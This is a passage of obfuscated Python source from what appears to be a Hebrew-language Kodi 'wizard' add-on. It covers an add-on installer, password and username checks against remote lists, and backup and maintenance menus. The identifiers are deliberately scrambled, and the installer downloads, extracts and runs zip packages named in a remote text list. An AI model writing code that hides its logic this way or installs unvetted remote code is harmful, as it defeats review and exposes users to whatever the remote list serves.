			OOO0O0OO00OO0OOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOOO0OO000OOOO0 ).findall (OOOOO0OOO00O000O0 )#line:2520
			if len (OOO0O0OO00OO0OOOO )>0 :#line:2521
				for O0OO00OOO00OOOO0O ,O0O0O0000000OO000 ,O00OO0OO0OO0O000O ,O0000O0OO0000OO0O ,OO0O0O0OO00OO0000 ,O0000OOO00OOOO000 ,OO00OO0OO0OOO0O0O ,O00O000OO00O0000O ,O0000OO0OOO0OOO00 in OOO0O0OO00OO0OOOO :#line:2522
					if os .path .exists (os .path .join (ADDONS ,OOOOOO0OO000OOOO0 )):#line:2523
						O000O0O00000O0O0O =['Launch Addon','Remove Addon']#line:2524
						OOO0O00O00O000000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O000O0O00000O0O0O )#line:2525
						if OOO0O00O00O000000 ==0 :#line:2526
							wiz .ebi ('RunAddon(%s)'%OOOOOO0OO000OOOO0 )#line:2527
							xbmc .sleep (1000 )#line:2528
							return True #line:2529
						elif OOO0O00O00O000000 ==1 :#line:2530
							wiz .cleanHouse (os .path .join (ADDONS ,OOOOOO0OO000OOOO0 ))#line:2531
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOOOO0OO000OOOO0 ))#line:2532
							except :pass #line:2533
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOOO0OO000OOOO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2534
								removeAddonData (OOOOOO0OO000OOOO0 )#line:2535
							wiz .refresh ()#line:2536
							return True #line:2537
						else :#line:2538
							return False #line:2539
					OO0O00OOOOO000OOO =os .path .join (ADDONS ,O00OO0OO0OO0O000O )#line:2540
					if not O00OO0OO0OO0O000O .lower ()=='none'and not os .path .exists (OO0O00OOOOO000OOO ):#line:2541
						wiz .log ("Repository not installed, installing it")#line:2542
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOOOO0OO000OOOO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OO0OO0OO0O000O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2543
							OOO00O0000OO0000O =wiz .parseDOM (wiz .openURL (O0000O0OO0000OO0O ),'addon',ret ='version',attrs ={'id':O00OO0OO0OO0O000O })#line:2544
							if len (OOO00O0000OO0000O )>0 :#line:2545
								OOO0000O000O0O0OO ='%s%s-%s.zip'%(OO0O0O0OO00OO0000 ,O00OO0OO0OO0O000O ,OOO00O0000OO0000O [0 ])#line:2546
								wiz .log (OOO0000O000O0O0OO )#line:2547
								if KODIV >=17 :wiz .addonDatabase (O00OO0OO0OO0O000O ,1 )#line:2548
								installAddon (O00OO0OO0OO0O000O ,OOO0000O000O0O0OO )#line:2549
								wiz .ebi ('UpdateAddonRepos()')#line:2550
								wiz .log ("Installing Addon from Kodi")#line:2552
								OO00O00O00OOOOOOO =installFromKodi (OOOOOO0OO000OOOO0 )#line:2553
								wiz .log ("Install from Kodi: %s"%OO00O00O00OOOOOOO )#line:2554
								if OO00O00O00OOOOOOO :#line:2555
									wiz .refresh ()#line:2556
									return True #line:2557
							else :#line:2558
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OO0OO0OO0O000O )#line:2559
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOOOO0OO000OOOO0 ,O00OO0OO0OO0O000O ))#line:2560
					elif O00OO0OO0OO0O000O .lower ()=='none':#line:2561
						wiz .log ("No repository, installing addon")#line:2562
						OOO0O00OOO0OOOOOO =OOOOOO0OO000OOOO0 #line:2563
						O0OOOO0OOOO0O000O =O0O0O0000000OO000 #line:2564
						installAddon (OOOOOO0OO000OOOO0 ,O0O0O0000000OO000 )#line:2565
						wiz .refresh ()#line:2566
						return True #line:2567
					else :#line:2568
						wiz .log ("Repository installed, installing addon")#line:2569
						OO00O00O00OOOOOOO =installFromKodi (OOOOOO0OO000OOOO0 ,False )#line:2570
						if OO00O00O00OOOOOOO :#line:2571
							wiz .refresh ()#line:2572
							return True #line:2573
					if os .path .exists (os .path .join (ADDONS ,OOOOOO0OO000OOOO0 )):return True #line:2574
					OO00OO0OOOO00OOOO =wiz .parseDOM (wiz .openURL (O0000O0OO0000OO0O ),'addon',ret ='version',attrs ={'id':OOOOOO0OO000OOOO0 })#line:2575
					if len (OO00OO0OOOO00OOOO )>0 :#line:2576
						O0O0O0000000OO000 ="%s%s-%s.zip"%(O0O0O0000000OO000 ,OOOOOO0OO000OOOO0 ,OO00OO0OOOO00OOOO [0 ])#line:2577
						wiz .log (str (O0O0O0000000OO000 ))#line:2578
						if KODIV >=17 :wiz .addonDatabase (OOOOOO0OO000OOOO0 ,1 )#line:2579
						installAddon (OOOOOO0OO000OOOO0 ,O0O0O0000000OO000 )#line:2580
						wiz .refresh ()#line:2581
					else :#line:2582
						wiz .log ("no match");return False #line:2583
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2584
		else :wiz .log ("[Addon Installer] Text File: %s"%O00O000000000O000 )#line:2585
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2586
def installFromKodi (O000OO0O000O000OO ,over =True ):#line:2588
	if over ==True :#line:2589
		xbmc .sleep (2000 )#line:2590
	wiz .ebi ('RunPlugin(plugin://%s)'%O000OO0O000O000OO )#line:2592
	if not wiz .whileWindow ('yesnodialog'):#line:2593
		return False #line:2594
	xbmc .sleep (1000 )#line:2595
	if wiz .whileWindow ('okdialog'):#line:2596
		return False #line:2597
	wiz .whileWindow ('progressdialog')#line:2598
	if os .path .exists (os .path .join (ADDONS ,O000OO0O000O000OO )):return True #line:2599
	else :return False #line:2600
def installAddon (O0OO0OOOOO0O0O0O0 ,O00000OO0O00O0OOO ):#line:2602
	if not wiz .workingURL (O00000OO0O00O0OOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0OOOOO0O0O0O0 ,COLOR2 ));return #line:2603
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2604
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OOOOO0O0O0O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2605
	OO00OOO0OOOO0OO0O =O00000OO0O00O0OOO .split ('/')#line:2606
	OO0O0OOOOOO000O00 =os .path .join (PACKAGES ,OO00OOO0OOOO0OO0O [-1 ])#line:2607
	try :os .remove (OO0O0OOOOOO000O00 )#line:2608
	except :pass #line:2609
	downloader .download (O00000OO0O00O0OOO ,OO0O0OOOOOO000O00 ,DP )#line:2610
	OOOOOO0OOOOO00O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OOOOO0O0O0O0 )#line:2611
	DP .update (0 ,OOOOOO0OOOOO00O0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2612
	OO00O0O0OO0OO00OO ,OOOOO00OO0000OO0O ,O0O00O00OOOO000OO =extract .all (OO0O0OOOOOO000O00 ,ADDONS ,DP ,title =OOOOOO0OOOOO00O0O )#line:2613
	DP .update (0 ,OOOOOO0OOOOO00O0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2614
	installed (O0OO0OOOOO0O0O0O0 )#line:2615
	installDep (O0OO0OOOOO0O0O0O0 ,DP )#line:2616
	DP .close ()#line:2617
	wiz .ebi ('UpdateAddonRepos()')#line:2618
	wiz .ebi ('UpdateLocalAddons()')#line:2619
	wiz .refresh ()#line:2620
def installDep (O00OOOO0000O00OOO ,DP =None ):#line:2622
	O000000O000O0OOO0 =os .path .join (ADDONS ,O00OOOO0000O00OOO ,'addon.xml')#line:2623
	if os .path .exists (O000000O000O0OOO0 ):#line:2624
		OOOO0O00OOOO00OO0 =open (O000000O000O0OOO0 ,mode ='r');OO0O0O000OO00OO00 =OOOO0O00OOOO00OO0 .read ();OOOO0O00OOOO00OO0 .close ();#line:2625
		O0000O00OOOO0O0O0 =wiz .parseDOM (OO0O0O000OO00OO00 ,'import',ret ='addon')#line:2626
		for OO00O00O0OOO0O0O0 in O0000O00OOOO0O0O0 :#line:2627
			if not 'xbmc.python'in OO00O00O0OOO0O0O0 :#line:2628
				if not DP ==None :#line:2629
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O00O0OOO0O0O0 ))#line:2630
				wiz .createTemp (OO00O00O0OOO0O0O0 )#line:2631
def installed (OO00O0000OOOO0O0O ):#line:2658
	OOO00O00OOOO0O0OO =os .path .join (ADDONS ,OO00O0000OOOO0O0O ,'addon.xml')#line:2659
	if os .path .exists (OOO00O00OOOO0O0OO ):#line:2660
		try :#line:2661
			O0OO0O000OOOOO0O0 =open (OOO00O00OOOO0O0OO ,mode ='r');OOO00OOOO0OO000OO =O0OO0O000OOOOO0O0 .read ();O0OO0O000OOOOO0O0 .close ()#line:2662
			O0O000000000O0OO0 =wiz .parseDOM (OOO00OOOO0OO000OO ,'addon',ret ='name',attrs ={'id':OO00O0000OOOO0O0O })#line:2663
			OO00O00O00O00O000 =os .path .join (ADDONS ,OO00O0000OOOO0O0O ,'icon.png')#line:2664
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O000000000O0OO0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00O00O00O00O000 )#line:2665
		except :pass #line:2666
def youtubeMenu (url =None ):#line:2668
	if not YOUTUBEFILE =='http://':#line:2669
		if url ==None :#line:2670
			O0O000OOOOO00OO00 =wiz .workingURL (YOUTUBEFILE )#line:2671
			O0OOO00OO000O0O0O =uservar .YOUTUBEFILE #line:2672
		else :#line:2673
			O0O000OOOOO00OO00 =wiz .workingURL (url )#line:2674
			O0OOO00OO000O0O0O =url #line:2675
		if O0O000OOOOO00OO00 ==True :#line:2676
			O00OO00OOOOOO0OO0 =wiz .openURL (O0OOO00OO000O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2677
			O0OOOO00OOOO00O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO00OOOOOO0OO0 )#line:2678
			if len (O0OOOO00OOOO00O0O )>0 :#line:2679
				for OO00O00O0OO0O000O ,OO00O0O0O00OOO0OO ,url ,O00O000O0O00O00O0 ,O0OOOO000OO0OO00O ,O00O000OO0O0OO000 in O0OOOO00OOOO00O0O :#line:2680
					if OO00O0O0O00OOO0OO .lower ()=="yes":#line:2681
						addDir ("[B]%s[/B]"%OO00O00O0OO0O000O ,'youtube',url ,description =O00O000OO0O0OO000 ,icon =O00O000O0O00O00O0 ,fanart =O0OOOO000OO0OO00O ,themeit =THEME3 )#line:2682
					else :#line:2683
						addFile (OO00O00O0OO0O000O ,'viewVideo',url =url ,description =O00O000OO0O0OO000 ,icon =O00O000O0O00O00O0 ,fanart =O0OOOO000OO0OO00O ,themeit =THEME2 )#line:2684
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2685
		else :#line:2686
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2687
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2688
			addFile ('%s'%O0O000OOOOO00OO00 ,'',themeit =THEME3 )#line:2689
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2690
	setView ('files','viewType')#line:2691
def STARTP ():#line:2692
	OO0OOOOO0O0000OO0 =(ADDON .getSetting ("pass"))#line:2693
	if BUILDNAME =="":#line:2694
	 if not NOTIFY =='true':#line:2695
          OOO0OO0OO0O0O0OO0 =wiz .workingURL (NOTIFICATION )#line:2696
	 if not NOTIFY2 =='true':#line:2697
          OOO0OO0OO0O0O0OO0 =wiz .workingURL (NOTIFICATION2 )#line:2698
	 if not NOTIFY3 =='true':#line:2699
          OOO0OO0OO0O0O0OO0 =wiz .workingURL (NOTIFICATION3 )#line:2700
	OO0OOOOO000O000O0 =OO0OOOOO0O0000OO0 #line:2701
	OOO0OO0OO0O0O0OO0 =urllib2 .Request (SPEED )#line:2702
	O000O0OO0OO0OOO00 =urllib2 .urlopen (OOO0OO0OO0O0O0OO0 )#line:2703
	O00O00000O00OO0OO =O000O0OO0OO0OOO00 .readlines ()#line:2705
	O00O000OO000O0OO0 =0 #line:2709
	for O000O0OO0OOOO00OO in O00O00000O00OO0OO :#line:2710
		if O000O0OO0OOOO00OO .split (' ==')[0 ]==OO0OOOOO0O0000OO0 or O000O0OO0OOOO00OO .split ()[0 ]==OO0OOOOO0O0000OO0 :#line:2711
			O00O000OO000O0OO0 =1 #line:2712
			break #line:2713
	if O00O000OO000O0OO0 ==0 :#line:2714
					O00OOO00O0OOO000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2715
					if O00OOO00O0OOO000O :#line:2717
						ADDON .openSettings ()#line:2719
						sys .exit ()#line:2721
					else :#line:2722
						sys .exit ()#line:2723
	return 'ok'#line:2727
def STARTP2 ():#line:2728
	O0OOOO00O00OO00O0 =(ADDON .getSetting ("user"))#line:2729
	OOOOO0O00OOO0O000 =(UNAME )#line:2731
	O00O00OOO0O00OOO0 =urllib2 .urlopen (OOOOO0O00OOO0O000 )#line:2732
	O0OO0OO000OOO0O0O =O00O00OOO0O00OOO0 .readlines ()#line:2733
	O0OOOO0O0OOO00000 =0 #line:2734
	for OOO00O00O000OOOO0 in O0OO0OO000OOO0O0O :#line:2737
		if OOO00O00O000OOOO0 .split (' ==')[0 ]==O0OOOO00O00OO00O0 or OOO00O00O000OOOO0 .split ()[0 ]==O0OOOO00O00OO00O0 :#line:2738
			O0OOOO0O0OOO00000 =1 #line:2739
			break #line:2740
	if O0OOOO0O0OOO00000 ==0 :#line:2741
		O00O0O00O00OOOOO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2742
		if O00O0O00O00OOOOO0 :#line:2744
			ADDON .openSettings ()#line:2746
			sys .exit ()#line:2749
		else :#line:2750
			sys .exit ()#line:2751
	return 'ok'#line:2755
def passandpin ():#line:2756
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2757
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2758
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2759
def passandUsername ():#line:2760
	ADDON .openSettings ()#line:2761
def folderback ():#line:2764
    O0OOO0OO0OOO00OOO =ADDON .getSetting ("path")#line:2765
    if O0OOO0OO0OOO00OOO :#line:2766
      O0OOO0OO0OOO00OOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2767
      ADDON .setSetting ("path",O0OOO0OO0OOO00OOO )#line:2768
def backmyupbuild ():#line:2771
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
def maintMenu (view =None ):#line:2787
	OOO0O00O0OO000OOO ='[B][COLOR green]ON[/COLOR][/B]';OOO0OO0OO0OOOO00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2789
	OOO00OO0OO0OO00OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2790
	OO00OOO00000O0OOO ='true'if AUTOCACHE =='true'else 'false'#line:2791
	OO0OOO0OO00O0O00O ='true'if AUTOPACKAGES =='true'else 'false'#line:2792
	O0O0000OOO0OOOOOO ='true'if AUTOTHUMBS =='true'else 'false'#line:2793
	O0000OOO00O000OOO ='true'if SHOWMAINT =='true'else 'false'#line:2794
	O0OO0OO0OO00O0O00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2795
	O0OO0OOOO00O0OO00 ='true'if INCLUDEALL =='true'else 'false'#line:2796
	OO00O00OO00O0O0O0 ='true'if THIRDPARTY =='true'else 'false'#line:2797
	if wiz .Grab_Log (True )==False :OOOOOOO000000000O =0 #line:2798
	else :OOOOOOO000000000O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2799
	if wiz .Grab_Log (True ,True )==False :OO0O000OO0O00O000 =0 #line:2800
	else :OO0O000OO0O00O000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2801
	O00O000OOO00OO0OO =int (OOOOOOO000000000O )+int (OO0O000OO0O00O000 )#line:2802
	OOOOO00O00O0OOO0O =str (O00O000OOO00OO0OO )+' Error(s) Found'if O00O000OOO00OO0OO >0 else 'None Found'#line:2803
	OOOO0O0O0OO0O0000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2804
	if O0OO0OOOO00O0OO00 =='true':#line:2805
		O0O0O00000OOOOOO0 ='true'#line:2806
		O0OOO0O0OO0000OO0 ='true'#line:2807
		OOO0O000O00OOO00O ='true'#line:2808
		OOOOO00OO00OO0OOO ='true'#line:2809
		OOOO0O0000O0OOO00 ='true'#line:2810
		O00OOOOO00OO0OOOO ='true'#line:2811
		OOOOOO0OOOOO00O00 ='true'#line:2812
		OOOOOO0OOOOOO000O ='true'#line:2813
	else :#line:2814
		O0O0O00000OOOOOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2815
		O0OOO0O0OO0000OO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2816
		OOO0O000O00OOO00O ='true'if INCLUDESPECTO =='true'else 'false'#line:2817
		OOOOO00OO00OO0OOO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2818
		OOOO0O0000O0OOO00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2819
		O00OOOOO00OO0OOOO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2820
		OOOOOO0OOOOO00O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2821
		OOOOOO0OOOOOO000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2822
	OO000O00OOO000000 =wiz .getSize (PACKAGES )#line:2823
	OO00OO0O0000OOO00 =wiz .getSize (THUMBS )#line:2824
	OOO0000OO0O0OOO0O =wiz .getCacheSize ()#line:2825
	O0O0OOO00OO0OOOOO =OO000O00OOO000000 +OO00OO0O0000OOO00 +OOO0000OO0O0OOO0O #line:2826
	OO0OO0O000OOO00OO =['Daily','Always','3 Days','Weekly']#line:2827
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2828
	if view =="clean"or SHOWMAINT =='true':#line:2829
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OOO00OO0OOOOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0000OO0O0OOO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000O00OOO000000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OO0O0000OOO00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2837
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2838
	if view =="addon"or SHOWMAINT =='false':#line:2839
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="misc"or SHOWMAINT =='true':#line:2848
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Errors in Log: %s'%(OOOOO00O00O0OOO0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Clear Wizard Log File%s'%OOOO0O0O0OO0O0000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2858
	if view =="backup"or SHOWMAINT =='true':#line:2859
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2872
	if view =="tweaks"or SHOWMAINT =='true':#line:2873
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2874
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		else :#line:2876
			if os .path .exists (ADVANCED ):#line:2877
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2878
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2879
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	addFile ('Show All Maintenance: %s'%O0000OOO00O000OOO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2887
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2888
	addFile ('Third Party Wizards: %s'%OO00O00OO00O0O0O0 .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2889
	if OO00O00OO00O0O0O0 =='true':#line:2890
		O0OO000OO00OOO000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2891
		OO00OOO0OO0000O0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2892
		OO00OO0OO0O0OOO0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2893
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO000OO00OOO000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00OOO0OO0000O0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00OO0OO0O0OOO0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO00OO0OO0OO00OO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2898
	if OOO00OO0OO0OO00OO =='true':#line:2899
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO0OO0O000OOO00OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00OOO00000O0OOO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0OOO0OO00O0O00O .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0000OOO0OOOOOO .replace ('true',OOO0O00O0OO000OOO ).replace ('false',OOO0OO0OO0OOOO00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2903
